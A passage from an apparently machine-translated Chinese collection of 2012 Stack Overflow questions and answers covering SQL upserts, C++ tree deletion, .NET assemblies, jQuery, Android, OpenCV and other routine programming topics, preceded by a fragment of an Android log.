09-25 22:45:13.741: V/Magick(554): Attempting to read from file /mnt/sdcard/2.jpeg
09-25 22:45:14.112: V/Magick(554): ReadImage completed
09-25 22:45:14.534: D/dalvikvm(164): GC_EXPLICIT freed 151K, 7% free 21612K/23111K, paused 530ms+341ms
09-25 22:45:17.378: W/ActivityManager(80): Launch timeout has expired, giving up wake lock!
09-25 22:45:18.417: W/ActivityManager(80): Activity idle timeout for ActivityRecord{4117ad80 com.example.libmagick/.MainActivity}
09-25 22:45:23.281: I/ActivityManager(80): Process com.android.mms (pid 257) has died.
09-25 22:45:23.312: D/CountryDetectorService(80): No listener is left
09-25 22:45:30.272: D/dalvikvm(164): GC_EXPLICIT freed 57K, 7% free 21556K/23111K, paused 1035ms+723ms
09-25 22:45:34.442: D/dalvikvm(195): GC_EXPLICIT freed 112K, 5% free 12588K/13191K, paused 1724ms+88ms
09-25 22:45:41.332: D/dalvikvm(314): GC_EXPLICIT freed 158K, 5% free 12155K/12675K, paused 1287ms+291ms
09-25 22:45:59.741: V/TLINE(554): new: android.text.TextLine@40c43e30
09-25 22:46:00.462: D/dalvikvm(554): GC_FOR_ALLOC freed 3165K, 22% free 14154K/17927K, paused 158ms
09-25 22:46:00.462: I/dalvikvm-heap(554): Grow heap (frag case) to 15.274MB for 1155904-byte allocation
09-25 22:46:00.662: D/dalvikvm(554): GC_CONCURRENT freed <1K, 15% free 15283K/17927K, paused 11ms+4ms
09-25 22:46:00.922: D/dalvikvm(554): GC_FOR_ALLOC freed 1K, 15% free 15282K/17927K, paused 71ms
09-25 22:46:00.952: I/dalvikvm-heap(554): Grow heap (frag case) to 17.232MB for 2054928-byte allocation
09-25 22:46:01.062: D/dalvikvm(554): GC_FOR_ALLOC freed 0K, 14% free 17288K/19975K, paused 95ms
09-25 22:46:01.262: D/dalvikvm(554): GC_CONCURRENT freed <1K, 14% free 17289K/19975K, paused 9ms+4ms
09-25 22:46:02.402: D/dalvikvm(164): GC_EXPLICIT freed 5K, 7% free 21551K/23111K, paused 5ms+129ms
09-25 22:46:06.522: D/dalvikvm(554): GC_FOR_ALLOC freed 1286K, 18% free 16453K/19975K, paused 73ms
09-25 22:46:06.542: I/dalvikvm-heap(554): Grow heap (frag case) to 17.881MB for 1536016-byte allocation
09-25 22:46:06.722: D/dalvikvm(554): GC_FOR_ALLOC freed <1K, 17% free 17953K/21511K, paused 91ms
09-25 22:46:06.922: D/dalvikvm(554): GC_CONCURRENT freed <1K, 17% free 17953K/21511K, paused 7ms+4ms
09-25 22:46:07.212: D/dalvikvm(554): GC_FOR_ALLOC freed <1K, 17% free 17952K/21511K, paused 72ms
09-25 22:46:07.232: I/dalvikvm-heap(554): Grow heap (frag case) to 19.345MB for 1536016-byte allocation
09-25 22:46:07.422: D/dalvikvm(554): GC_FOR_ALLOC freed 0K, 16% free 19452K/23047K, paused 107ms
09-25 22:46:07.531: D/dalvikvm(554): GC_FOR_ALLOC freed 0K, 16% free 19452K/23047K, paused 97ms
09-25 22:46:07.552: I/dalvikvm-heap(554): Grow heap (frag case) to 20.810MB for 1536016-byte allocation
09-25 22:46:07.722: D/dalvikvm(554): GC_FOR_ALLOC freed 0K, 15% free 20952K/24583K, paused 138ms
09-25 22:46:08.781: I/ActivityManager(80): Displayed com.example.libmagick/.MainActivity: +1m1s413ms
09-25 22:46:08.781: W/InputManagerService(80): Window already focused, ignoring focus gain of: com.android.internal.view.IInputMethodClient$Stub$Proxy@411f68b8 
```

# sql - 使用 Case 语句插入表或更新现有行

> ID：12587929
> 
> 赞同：0
> 
> 时间：2012-09-25T17:18:01.583
> 
> 标签：sql, sql-server-2008, tsql, insert

> **可能重复：**
> [SQL Server 上的 INSERT OR UPDATE 解决方案](https://stackoverflow.com/questions/108403/solutions-for-insert-or-update-on-sql-server)
> [仅在不存在的情况下插入行](https://stackoverflow.com/questions/3407857/only-inserting-a-row-if-its-not-already-there)

我的标题几乎解释了我正在尝试做的事情，但我会更详细地介绍。我正在创建一个存储过程，在调用它时首先检查该行是否已经存在（通过比较两个参数），如果存在，它将更新该行中的特定列，如果该行不存在它将在表中插入一个新行。

```
BEGIN
SELECT 
(
CASE WHEN [Site] = @site and Plant = @plant
then 
UPDATE [Status]
FROM Server_Status
WHERE [Site] = @site
ELSE
Insert into Server_Status(Name, [Path], [Site], Plant, [Status])
Values (@name, @path, @site, @plant, @status)
end
)
FROM Server_Status 
END 
```

是我到目前为止所拥有的，但不起作用（显然）。有没有比我有更多 SQL 知识的人有任何建议？

-J

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-25T17:25:07.800

您可能想看看[MERGE (Transact-SQL)](http://technet.microsoft.com/en-us/library/bb510625.aspx)语句。

> 根据与源表连接的结果对目标表执行插入、更新或删除操作。例如，您可以通过根据在另一个表中发现的差异在一个表中插入、更新或删除行来同步两个表。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-25T17:22:02.827

你可以做：

```
IF EXISTS(SELECT * FROM MyTable WHERE...)
 --value exists perform update
  BEGIN
    UPDATE...
  END
ELSE
  --value doesnt exist perform insert
  BEGIN
    INSERT ...
  END 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-25T17:22:53.487

您应该首先使用 IF EXISTS 语句检查该行是否存在，如下所示：

```
IF EXISTS (SELECT * FROM Server_Status WHERE Site = @Site) 
BEGIN
    -- UPDATE statement.
END
ELSE
    -- INSERT statement.
END 
```

# c++ - 通过引用传递指针未按预期工作

> ID：12587930
> 
> 赞同：0
> 
> 时间：2012-09-25T17:18:03.927
> 
> 标签：c++, pointers, pass-by-reference, binary-search-tree

我正在编写代码以递归方式从 BST 中删除一个节点，主要是作为一个学习练习来实现递归并验证我对我使用的某些编码元素的理解。在这种情况下，问题似乎在于通过引用将指针传递给我的 BST 节点。

我的 BST 代码的 psrt 如下。（这不是我要实现或使用的代码。只是一个练习。我选择 BST 作为示例来实现一些我想用该语言尝试的东西）

标题 -

```
//BST.h
class TNode
{
public:
    TNode():data(0), left(0), right(0) {}
    int data;
    TNode* left;
    TNode* right;
};

class BST
{
private:
    TNode* Head;

public:
    BST();

    void InsertData(int data);
    void InsertNode(TNode* node);
    void DeleteData(int data);

private:
    void InsertDataPrivate(int data, TNode* &root); 
    void InsertNodePrivate(TNode* node, TNode* &root);
    void DeleteDataPrivate(int data, TNode* &root);
}; 
```

CPP -

```
//BST.cpp
#include "BST.h"

BST::BST(): Head(0)
{

}

void BST::InsertData(int data)
{
    InsertDataPrivate(data, Head);
}

void BST::InsertNode(TNode* node)
{
    InsertNodePrivate(node, Head);
}

void BST::DeleteData(int data)
{
    DeleteDataPrivate(data, Head);
}

void BST::InsertDataPrivate(int data, TNode* &root) 
{
    if(root == 0)
    {
        root = new TNode();
        root->data = data;
    }
    else if(data < root->data) InsertDataPrivate(data, root->left);
    else if(data > root->data) InsertDataPrivate(data, root->right); 
}

void BST::InsertNodePrivate(TNode* node, TNode* &root) 
{
    if(root == 0) // Deep Copy
    {
        root = new TNode();
        root->data = node->data;
    }

    else if(node->data < root->data) InsertNodePrivate(node, root->left);
    else if(node->data > root->data) InsertNodePrivate(node, root->right); 
}

void BST::DeleteDataPrivate(int data, TNode* &root)
{
    if( 0 == root ) return;

    if( root->data == data )
    {
        if(0 == root->left && 0 == root->right)
        {
            delete root;
            root = 0;
        }
        else if(0 == root->left)
        {
            TNode* current = root;
            root = root->right;
            delete current;
            current = 0;
        }
        else if(0 == root->right)
        {
            TNode* current = root;
            root = root->left;
            delete current;
            current = 0;
        }
        else
        {
            TNode* biggestOnLeft = root->left;
            TNode* smallestOnRight = root->right;
            int i = 0;
            while (biggestOnLeft->right) // check if left subtree is longer than right subtree
            {
                biggestOnLeft = biggestOnLeft->right;
                --i;
            }
            while (smallestOnRight->left)
            {
                smallestOnRight = smallestOnRight->left;
                ++i;
            }
            if(i < 0) // left subtree is longer than right subtree
            {
                root->data = biggestOnLeft->data;
                DeleteDataPrivate(biggestOnLeft->data, biggestOnLeft);
            }
            else // right subtree is longer than or equal in size to left subtree
            {
                root->data = smallestOnRight->data;
                DeleteDataPrivate(smallestOnRight->data, smallestOnRight);
            }
        }
    }
    else if(data < root->data && 0 !=root->left)
    {
        DeleteDataPrivate(data, root->left);
    }
    else if(data > root->data && 0 !=root->right)
    {
        DeleteDataPrivate(data, root->right);
    }
} 
```

我的测试代码如下 -

```
//TestMain.cpp
#include "stdafx.h"
#include "BST.h"

int _tmain(int argc, _TCHAR* argv[])
{
    BST bst;

    bst.InsertData(32);
    bst.InsertData(46);
    bst.InsertData(3463);
    bst.InsertData(32);
    bst.InsertData(856);
    bst.InsertData(8098);
    bst.InsertData(345);
    bst.InsertData(234554);
    bst.InsertData(77);
    bst.InsertData(9);
    bst.InsertData(15);
    bst.InsertData(390);
    bst.InsertData(350);
    bst.InsertData(400);
    bst.InsertData(76);
    bst.InsertData(78);
    bst.InsertData(355);
    bst.DeleteData(77);

    return 0;
} 
```

在我说`bst.DeleteData(77);`我有问题的最后一步。带有“77”的节点被删除，并被“78”替换，就像你从 BST 中删除一个带有两个子节点的节点一样。但是，在删除具有“77”的父节点之前删除具有“78”的节点后，仍然指向非空位置。

我正在调用我的私有函数，该函数`DeleteDataPrivate(int data, TNode* &root);`在删除 TNode 指针后将其设置为 NULL。此外，我在函数中通过引用传递指针，以便在递归堆栈展开时将 NULL 值分配给已删除的节点指针。这不会发生。有人可以解释我在这里做错了什么吗？

谢谢你。

钦梅

**更新**

根据 Dan 在下面的评论，问题在于将值传递给局部变量，这些变量复制了我的指针并且没有分配回任何东西。我已经修改了我的函数以通过使用指向指针的指针来解决此问题，以便展开递归返回的 TNode 指针的值存储在内存中的正确位置，而不是存储在 TNode 指针的某个副本中。

修改后的功能如下

```
void BST::DeleteDataPrivate(int data, TNode* &root)
{
    if( 0 == root ) return;

    if( root->data == data )
    {
        if(0 == root->left && 0 == root->right)
        {
            delete root;
            root = 0;
        }
        else if(0 == root->left)
        {
            TNode* current = root;
            root = root->right;
            delete current;
            current = 0;
        }
        else if(0 == root->right)
        {
            TNode* current = root;
            root = root->left;
            delete current;
            current = 0;
        }
        else
        {
            TNode* biggestOnLeft = root->left;
            TNode* smallestOnRight = root->right;
            int i = 0;
            while (biggestOnLeft->right) // check if left subtree is longer than right subtree
            {
                biggestOnLeft = biggestOnLeft->right;
                --i;
            }
            while (smallestOnRight->left)
            {
                smallestOnRight = smallestOnRight->left;
                ++i;
            }
            TNode** locationOfDeletedNode = 0;
            if(i < 0) // left subtree is longer than right subtree
            {

                locationOfDeletedNode = &(root->left);
                while(*locationOfDeletedNode != biggestOnLeft) locationOfDeletedNode = &((*locationOfDeletedNode)->right);
            }
            else // right subtree is longer than or equal in size to left subtree
            {
                locationOfDeletedNode = &(root->right);
                while(*locationOfDeletedNode != smallestOnRight) locationOfDeletedNode = &((*locationOfDeletedNode)->left);

            }
            root->data = (*locationOfDeletedNode)->data;
            DeleteDataPrivate((*locationOfDeletedNode)->data, *locationOfDeletedNode);
        }
    }
    else if(data < root->data && 0 !=root->left)
    {
        DeleteDataPrivate(data, root->left);
    }
    else if(data > root->data && 0 !=root->right)
    {
        DeleteDataPrivate(data, root->right);
    }
} 
```

当然，这可以更好地构建，但我的目标是在这里学习简单但棘手的东西，感谢 Dan 和其他人，我在这里做到了。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-25T17:33:07.390

你打电话时

```
DeleteDataPrivate(biggestOnLeft->data, biggestOnLeft); 
```

它只是分配给局部变量`biggestOnLeft`，它没有分配给任何对象的成员。

因为当你这样做时

```
TNode* biggestOnLeft = root->left; 
```

它创建了一个新变量，它是 的*副本*，`root->left`而不是同一件事。

## 修正想法

您可以尝试从根目录开始，然后`biggestOnLeft`做`smallestOnRight`

```
while (biggestOnLeft->right->right) 
```

然后你可以打电话

```
DeleteDataPrivate(biggestOnLeft->data, biggestOnLeft->right); 
```

免责声明：我没有对此进行测试，可能会出现错字或其他错误。

* * *

## 回答 #2

> 赞同：-2
> 
> 时间：2012-09-25T17:27:26.843

您不能通过引用 TNode 将 NULL 分配给指针，因为引用变量不能为 NULL。请参阅[C++ 通过引用传递指针并分配默认值](https://stackoverflow.com/a/1830064/147333)

# c# - 如何让 CLR 知道从 GAC 中选择哪个程序集？

> ID：12587949
> 
> 赞同：1
> 
> 时间：2012-09-25T17:19:16.117
> 
> 标签：c#, .net, gac, .net-assembly

```
using System;
using System.Collections.Generic;
using System.Text;
using Shapes;

namespace ShapeUser
{
    public class ShapeUser
    {
        public static void Main() 
        {
            Circle c = new Circle(1.0F);
            Console.WriteLine("Area of Circle(1.0) is {0}", c.Area());
            Console.ReadKey(); // press a key to exit program
        }
    }
} 
```

该程序正在使用`Shapes`GAC 中的程序集。如果只有一个程序集，那很好。但是，GAC 可能包含具有相同名称（但版本和密钥不同）的其他程序集。

**那么，如何告诉 CLR 只加载我的程序集而不是其他具有相同名称的程序集呢？**

我很困惑。我知道它受到公钥加密的保护，但我们仍然应该在我们访问它的程序中拥有一些私钥。请清除我的困惑。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-25T17:29:16.337

当您在 GAC 中引用程序集时，您**必须**通过其[强名称](http://msdn.microsoft.com/en-us/library/wd40t7ad.aspx)、其名称、版本号、文化（如果提供）加上公钥和数字签名的组合来引用它（程序集必须经过签名才能被视为强名称，并且只有强命名的程序集可以添加到 GAC）。

如果您引用一个强命名的程序集，那么您已经在唯一地标识您希望使用的程序集。如果您引用的程序集不是强命名的，则该程序集无法加载到 GAC 中（并且 .Net 运行时无论如何都不会检查那里，请参阅[运行时如何定位](http://msdn.microsoft.com/en-us/library/yx7xezcf.aspx)程序集）。

如果您正在引用一个强命名的程序集（或者实际上是*任何*程序集）并且想要接受该程序集的多个不同版本（例如 v1.0.0.0 和 v1.0.1.0），或者您想要发布更新版本的组装并允许现有应用程序继续运行而无需重新编译，那么您可以使用[Assembly Binding Redirection](http://msdn.microsoft.com/en-us/library/2fc472t2%28v=vs.110%29.aspx)。

如果您希望能够引用一个程序集，而不管使用什么密钥来签署该程序集，那么您最好根本不签署该程序集（因此不要将其添加到 GAC）。

我相信您也可以[订阅程序集解析事件](http://msdn.microsoft.com/en-us/library/ff527268.aspx)，但是使用程序集绑定重定向是首选方法，只要它提供所需的行为。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-25T17:21:21.710

编译时，您可以指定要使用的确切版本。这就是将在执行时加载的版本。如果您使用的是 Visual Studio，则引用的属性将包含版本号，以及一个标志，说明是否必须加载确切的版本号。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-25T17:22:25.073

程序集由其名称、公钥令牌和版本定义。创建参考时，您可以具体并指明这些值中的每一个。

# html - SSRS 2008 在报告中呈现 HTML

> ID：12587951
> 
> 赞同：0
> 
> 时间：2012-09-25T17:19:25.517
> 
> 标签：html, reporting-services, rendering

我有一个 SSRS 2008 报告应用程序。数据库中的一些字段存储在转义 HTML 中。下面是一个例子：

```
&lt;p&gt;   &amp;bull; ABC 123 leadership will be required from January 2013 through July 2015 based on proposal schedule included in the 123 proposal kick-off package&lt;br /&gt;   &lt;br /&gt;   &amp;bull; 65 deliverable ABCs (57 new ABCs required for DEF and 8 ABC kits carried over from F404 contract) will be build to print ABC-107s &amp;ndash; no effort is included in this bid to modify the design of these production units.&lt;br /&gt;   &amp;nbsp;&lt;/p&gt; 
```

**阐明为什么数据存储为 HTML**。
我们正在使用 CkEditor RTF 文本区域，以允许用户将格式化数据输入到我们的 Web 应用程序中，从该应用程序启动 SSRS 报告。

有没有办法在 SSRS 报告中呈现它，并且看起来就像在 HTML 网页中一样？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-25T17:44:26.727

您可以将[自定义报告项](http://msdn.microsoft.com/en-us/library/ms345231.aspx)与呈现 html 的代码一起使用，或者如果您只需要重新格式化文本，那么[自定义代码](http://msdn.microsoft.com/en-us/library/ms159238.aspx)就足够了

# javascript - jQueryUI 的 blockUI 不恰当地阻塞

> ID：12587953
> 
> 赞同：1
> 
> 时间：2012-09-25T17:19:30.603
> 
> 标签：javascript, jquery, asp.net-mvc-3, jquery-ui

我正在制作一个电子商务 web 应用程序（在 MVC3 中），现在我正在测试它。我的问题是：每当有人多次点击提交按钮时，我都会发出尽可能多的请求并将其保存在数据库中。所以我正在实现一些客户端和服务器端代码来防止这些多次提交。每当有人单击这样的提交按钮时，客户端都会阻止屏幕：

```
$(document).ready(function () {
    $('input[type=submit]').click(function () {
        blockScreen();
    });

    $.unblockUI();
}
function blockScreen() {
    $.blockUI({ message: '<h1><img src="../images/processing.gif" /></h1>' 
}); 
```

**我在使用 blockUI 时遇到的问题是，当有人单击提交但出现 ModelState 错误（例如未填写的必填字段）时，屏幕被阻止并且无法解除阻止，除非重新加载或使用浏览器的 console**。

服务器端验证，所以它不会有我稍后会做的复制，所以不需要考虑这个问题......

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-25T20:07:31.740

我找到了答案……按照 krish 的建议，我添加了这个脚本：

`<script src="@Url.Content("~/Scripts/jquery.validate.unobtrusive.min.js")" type="text/javascript"></script>`到我的主视图并在我的js上使用它：

```
$('form').submit(function () {
    if ($(this).valid()) {
        blockScreen();
    }
}); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-25T18:02:12.440

可能您正在使用 AJAX 请求将数据发送到您的数据库，对吧？

无需使用“点击”事件。有人可以通过在输入字段中按 Enter 来提交表单，我不确定在这种情况下会触发 click 事件。

我认为你应该使用这样的东西：

```
var isBlocked = false;

$('form').submit(function(){

  $.ajax({
    url: 'database.html',
    beforeSend: function (data) {
       var state = isBlocked;
       isBlocked = true;
       // Returning false in the beforeSend function will cancel the request.
       return !state;
    },
    complete: function(data) {
       // complete executes on both success and fail
       isBlocked = false;
    }
  });

}); 
```

`

# android - 关闭surfaceview活动后失去焦点

> ID：12587955
> 
> 赞同：0
> 
> 时间：2012-09-25T17:19:33.490
> 
> 标签：android, surfaceview

我的第一个项目有问题。我刚刚完成了我在 Android 中的第一场比赛，但是当我返回主菜单（主要活动）时，我的应用程序因系统错误而崩溃。

我有 3 个活动：

1.  菜单
2.  困难
3.  游戏（Surface View实现）

当我在我的游戏活动中触摸后退按钮时，它返回到主活动（菜单）但焦点消失了，几分钟后应用程序崩溃了。

原因可能是表面视图关闭还是渲染线程继续他的工作？

# android - 以编程方式关闭选项卡 TabHost

> ID：12587965
> 
> 赞同：0
> 
> 时间：2012-09-25T17:20:16.623
> 
> 标签：android, tabs, android-tabhost

如何关闭 TabHost 中的选项卡？（我的标签这个活动）。当我尝试：

```
tabHost.removeViewAt(tabHost.getCurrentTab()); 
```

我的应用程序崩溃。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-25T17:23:28.600

这应该有效：

`tabHost.getTabWidget().removeView(tabHost.getTabWidget().getChildTabViewAt(tab_index));`

`tab_index`您要删除的选项卡的索引在哪里。

# ios - 自定义 NSOperations 自动释放池

> ID：12587971
> 
> 赞同：1
> 
> 时间：2012-09-25T17:20:45.780
> 
> 标签：ios, nsoperation, nsautoreleasepool

我已经实现了一些`NSOperation`在队列中使用的自定义子类。

我应该（或可以）在哪里设置`@autoreleasepool`？

在我的自定义操作`main`方法中？

或者围绕我将操作添加到队列实例的语句？

编辑：

如果我使用块添加操作怎么办？也应该`@autoreleasepool`进入街区吗？

如果相关，我正在使用 ARC。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-25T17:43:34.697

使用自动释放池的主要原因是防止临时不需要的对象的大量聚集。例如，假设您的操作打开一堆图像，提取其中的一些片段（保存在 NSData 对象中），然后作为最后一步将新片段转换为图像。

在这种情况下，我会做的是将打开和提取部分放在自动释放池中（确保正确保留 NSData 对象），然后在创建和保存新图像之前退出它。这样，所有打开的图像肯定会被释放。

我知道没有理由在操作中通常使用自动释放池，因为一旦操作完成队列最喜欢然后或之后不久。

事实上，使用 ARC，编译器有时会将对象从自动释放池中拉出，然后保留，然后在不需要时直接释放它们。

除非你有一个已知的迫切需要一个游泳池，否则我不会使用一个。现在，如果您使用带有“start”方法的并发 NSOperation，那就是另一回事了，您应该使用池将代码包装在 runloop 周围。

# android - HTML5 音频：Android 上的 Chrome 不会自动播放歌曲，而 PC 上的 Chrome 会

> ID：12587977
> 
> 赞同：14
> 
> 时间：2012-09-25T17:21:01.173
> 
> 标签：android, google-chrome

我制作了一个 HTML5 iPod。

你可以在这里试试。

[http://inventikasolutions.com/demo/iPod](http://inventikasolutions.com/demo/iPod)

在 PC 上，同时使用 Chrome。如果我导航到一首歌曲，它会自动开始播放。但是在 Android 上使用 Chrome 时，它​​不会播放歌曲。我必须再次点击播放/暂停按钮才能播放音频。

这是运行的代码，当您选择要播放的歌曲时：

```
audioPlayer.src=songurl[number];
audioPlayer.oncanplaythrough = "isAppLoaded";
audioPlayer.autoplay = "autoplay";
audioPlayer.addEventListener('ended',nextSong,false);
document.getElementById("player").appendChild(audioPlayer); 
```

这是播放/暂停代码。

```
 if (audioPlayer.paused)
        {
        audioPlayer.play();
        $("#pauseindicator").hide();
        $("#playindicator").show();
        }
        else
        {
        audioPlayer.pause();
        $("#pauseindicator").show();
        $("#playindicator").hide();
        } 
```

它可能与“自动播放”变量有关吗？Android 中的默认浏览器会立即播放歌曲。

谢谢。

* * *

## 回答 #1

> 赞同：34
> 
> 时间：2014-07-19T15:51:18.713

万一有人碰到这个 - Android 版本的 Chrome 实际上会阻止自动播放功能，但您可以更改浏览器的设置。为此，您必须输入**chrome://flags**并将***禁用媒体播放的手势要求***设置为开。无法通过网络强制执行此设置，但如果您像我一样编写专用的网络应用程序，您可以使用它。

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2013-02-15T12:21:24.877

请参考这个链接...

[http://code.google.com/p/chromium/issues/detail?id=138132](http://code.google.com/p/chromium/issues/detail?id=138132)

Chrome 不允许应用程序在没有用户明确操作的情况下播放 HTML5 音频，这与 iOS 的处理方式类似，但与 Android 浏览器处理它的方式不同。

Android 不支持自动播放，因为它会消耗数据流量。

* * *

## 回答 #3

> 赞同：8
> 
> 时间：2017-05-17T13:24:46.757

将 create.js 添加到您的页面：

```
<script src="https://code.createjs.com/createjs-2015.11.26.min.js"></script> 
```

然后以这种方式发出声音：

```
<script>
    createjs.Sound.registerSound("./click.mp3", "x");
    setTimeout(function () {
        createjs.Sound.play("x");
    }, 10000)
</script> 
```

在最新的 Android 上为我工作。

* * *

## 回答 #4

> 赞同：6
> 
> 时间：2017-10-26T15:43:02.130

似乎有一种新方法可以激活 Chrome 以自动播放音频和视频

转到 chrome://flags

设置`Autoplay policy`为`No user gesture is required`

[![铬标志](../Images/a165cc890ddb359911903a7118b2f40f.png)](https://i.stack.imgur.com/rTFth.png)

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2013-09-10T18:11:25.090

将您的 Chrome 更新到 29，此版本现在支持 WebAudio API 并修复了许多问题。

请参阅：[适用于 Android 的 Chrome 更新](http://googlechromereleases.blogspot.hu/2013/08/chrome-for-android-update.html)

我正在使用 SoundJS Lib 并且在所有浏览器中都运行良好（仅在默认 Android 浏览器和 Android 版本低于 4.1 的 Chrome 中运行不佳）。

请参阅以下示例：www.createjs.com/#!/SoundJS/demos/testSuite

支持 Android 版 Chrome 上的 Web 音频 API：code.google.com/p/chromium/issues/detail?id=166003

SoundJS 限制：community.createjs.com/kb/faq/soundjs-faq

# delphi - DLL中打开的表单在任务管理器中显示，如何隐藏？

> ID：12587984
> 
> 赞同：1
> 
> 时间：2012-09-25T17:21:21.903
> 
> 标签：delphi, c++builder, vcl, c++builder-xe2

我有许多通过 COM 在 XE2 DLL 中启动的表单。调用者是一个 VC 6 应用程序。

每个打开的表单都在 TaskManager 中显示为应用程序，我不希望这样，这些窗口只是对话框，而不是应用程序。

有没有可以用来不显示这些窗口的设置？

我正在使用 C++ Builder XE2，但 Delphi 解决方案可能对我有用。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-25T18:14:49.760

TaskManager 显示顶级无主窗口。您的 DLL 窗口没有指定任何所有者窗口。这就是它们出现的原因。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-26T08:25:31.413

将 TForm.BorderStyle 设置为 bsToolWindow 或 bsSizeToolWin。这将导致[WS_EX_TOOLWINDOW](http://msdn.microsoft.com/en-us/library/61fe4bte.aspx)包含在 Win32 窗口样式中。

或者，如果您覆盖[CreateParams](http://docwiki.embarcadero.com/Libraries/en/Vcl.Controls.TWinControl.CreateParams)方法，您可以手动设置它们。

我还认为[WS_POPUPWINDOW](http://msdn.microsoft.com/en-us/library/windows/desktop/ms632600.aspx)是在 CreateParams 中设置的，它的描述表明了这一点。

最后但并非最不重要的一点是，我会尝试从 C++ 应用程序传递[主窗口句柄，然后将其作为](https://www.google.ru/search?client=opera&rls=ru&q=mfc+hwnd&sourceid=opera&ie=utf-8&oe=utf-8&channel=suggest)[父 hwnd](http://docwiki.embarcadero.com/Libraries/en/Vcl.Controls.TWinControl.ParentWindow)分配给您的对话框窗口，如果这些窗口不是模态的。

# python - 如何将 OpenCV 库导入 Python？

> ID：12587985
> 
> 赞同：0
> 
> 时间：2012-09-25T17:21:24.110
> 
> 标签：python, opencv

我在这里搜索，几乎找不到任何接近答案的东西。我已经下载了 OpenCV 2.4.2 的 .tar 包并解压，然后我在 openCv 的原始文件夹之外创建了一个目录，然后调用`cmake`，花了一段时间，然后我调用了`make`& 然后`sudo make install`。这一切都发生了，没有任何错误，然后我重新安装了我的 python 并调用了它。然后尝试`import cv`了，我仍然得到：

```
raceback (most recent call last):
  File "<stdin>", line 1, in <module>
  File "/usr/lib/python2.7/site-packages/cv.py", line 1, in <module>
    from cv2.cv import *
ImportError: libavcodec.so.53: cannot open shared object file: No such file or directory 
```

我正在使用脉轮克莱尔。

还有一件事，python 3 不支持 openCV 是真的吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-25T18:55:59.383

看来OpenCV正在寻找`libavcodec.so.53`却找不到！

libavcodec 可能未安装在您的系统上，或者它不在默认系统路径中。

如果有，请确保在环境变量`LD_LIBRARY_PATH`(linux) 上设置了此路径。

# xml - 用于 XML 的 Eclipse 格式化程序，如 Java

> ID：12587986
> 
> 赞同：2
> 
> 时间：2012-09-25T17:21:33.690
> 
> 标签：xml, eclipse, eclipse-plugin

在 Eclipse 中，我需要像在 Java 上那样在`Ctrl``Shift``F`按下时使用 Formatter 格式化 XML。

使用`Ctrl``Shift``F`on XML 并不能提供我想要的结果。

有没有像“ *Window→Java→Code Style→Formatter* ”这样的工具来完成这项工作？

其中：“ *Window→XML→XML Files→Editor* ”和“ *Window→Editors→Text Editors* ”缺少很多功能，例如“ *Window→Java→Code Style→Formatter→Edit→Indentation→Align fields in columns* ”所以XML结果将是：

```
android:id              = "@+id/textView1"
android:layout_width    = "wrap_content"
android:layout_height   = "wrap_content" 
```

我不在乎它是外部插件还是库。我使用 Eclipse 4.2.0 Juno 进行 Android 开发。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-25T19:13:47.573

标记语言不能格式化为 Java 代码。尽管如此，您可以为默认`html`编辑器分配`.xml`文件类型，如下所示：

1.  `Window -> Preferences -> General -> Editors -> File Associations`

2.  `.xml`从顶部框中选择并将其分配给`Html editor`底部框。您也可以将其设置为默认值。

这样做将为所有`.xml`文件启用标记突出显示，并且您可以使用默认`Ctrl``Shift``F`快捷方式来格式化您的 xml 文件。

这种格式可以从`General->Editors->Structured Text Editors`. 那里没有很多选择，但它会完成这项工作。此外，您可以尝试使用其他格式化程序`php`（我认为它需要安装 PDT 到 Eclipse）。

如果您只对了解 xml 文件的结构感兴趣，而不仅仅是格式化它：

*   您可以使用众多在线[xml 美化](https://www.google.gr/search?q=xml%20beautifier&ie=utf-8&oe=utf-8&aq=t&rls=org.mozilla%3aen-US%3aofficial&client=firefox-a)器之一，或者
*   使用[XPath](http://en.wikipedia.org/wiki/XPath)工具

希望有帮助

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-25T17:32:34.230

在编辑器的上下文菜单 Source -> Format 上应该有一个菜单选项

# apache - 连接到 VisualSVN 时出现 SSL 错误

> ID：12587990
> 
> 赞同：1
> 
> 时间：2012-09-25T17:21:42.697
> 
> 标签：apache, ssl, tortoisesvn, router, visualsvn-server

我的 VisualSVN 服务器工作正常，直到我们有了新的路由器，现在当我尝试使用 TortoiseSVN 进行结帐时，我得到了错误：

```
`Unable to connect to a repository at URL` .
OPTIONS of URL: SSL handshake failed: SSL
error: unknown protocol URL 
```

关于问题是什么以及如何解决它的任何想法？

我已经将服务器和客户端软件都更新到了最新版本。

SSL 证书未签名/未经验证。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2020-01-23T13:20:50.300

您需要将您的 VisualSVN 服务器升级到最新版本并升级 TortoiseSVN 和其他 svn 客户端。这应该可以解决问题。

建议所有用户升级到 VisualSVN Server 4.2。升级简单直接，但我们强烈建议您事先阅读[KB161：升级到 VisualSVN Server 4.2](https://www.visualsvn.com/support/topic/00161/)文章（尤其是从 VisualSVN Server 3.9 或更早版本升级时）。

[您可以随时从主下载页面](https://www.visualsvn.com/server/download/)下载最新的 VisualSVN 服务器版本。

# json - 如何在没有双引号的情况下返回 Json 结果？

> ID：12587994
> 
> 赞同：1
> 
> 时间：2012-09-25T17:21:51.137
> 
> 标签：json, asp.net-mvc-3, return, jsonresult

我在控制器中使用此操作：

```
public JsonResult DoSomething(int id )
{
  char result = '0';
  ....
  return this.Json( result, JsonRequestBehavior.AllowGet );
} 
```

结果用双引号括起来： **"0"**、**"1"**、**"2"**等。

如何在没有双引号的情况下获得结果**0**、**1**、**2**等？

* * *

## 回答 #1

